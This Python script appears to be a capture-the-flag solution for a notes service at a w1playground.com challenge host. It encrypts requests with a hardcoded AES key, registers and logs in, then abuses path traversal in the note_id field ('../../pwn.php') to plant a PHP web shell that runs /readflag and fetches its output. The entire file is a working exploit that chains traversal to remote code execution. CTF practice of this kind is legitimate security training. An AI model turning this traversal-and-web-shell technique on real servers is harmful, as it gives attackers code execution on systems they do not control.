from requests import Session
from base64 import b64decode, b64encode
import json
from Crypto.Cipher import AES

AES_KEY = bytes(
    map(lambda x: x & 0xff,
        [-4, 100, 38, -55, -40, 65, -26, 50, 38, 125, -44, 72, 7,
         -84, -23, -42, -45, -84, -96, 77, -59, 42, -24, -89, -109,
         -20, -107, -101, -40, 76, -80, -26])
)


def decrypt(data):
    enc = b64decode(data)
    nonce, tag = enc[:12], enc[-16:]

    cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(enc[12:-16], tag)


def encrypt(data):
    data = json.dumps(data).encode()

    nonce = AES.get_random_bytes(12)
    cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)

    ciphertext, tag = cipher.encrypt_and_digest(data)
    return b64encode(nonce + ciphertext + tag)


s = Session()
s.headers.update({"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 3 XL Build/TQ2B.230505.005.A1)"})

TARGET = "http://29d92465038a34a8acf69129779a83c6.chall.w1playground.com:8082"
account = {"username": "inori", "password": "yuzuriha"}

r = s.post(TARGET, data=encrypt({"action": "register"} | account))
print(decrypt(r.text))

r = s.post(TARGET, data=encrypt({"action": "login"} | account))
data = decrypt(r.text)
print(data)

session_id = {"session_id": json.loads(data)["session_id"]}

payload = "<?php system('/readflag');"

r = s.post(TARGET, data=encrypt({"action": "save", "note_id": "../../pwn.php", "content": payload} | session_id))
print(decrypt(r.text))

r = s.get(TARGET + "/pwn.php")
print(r.text)
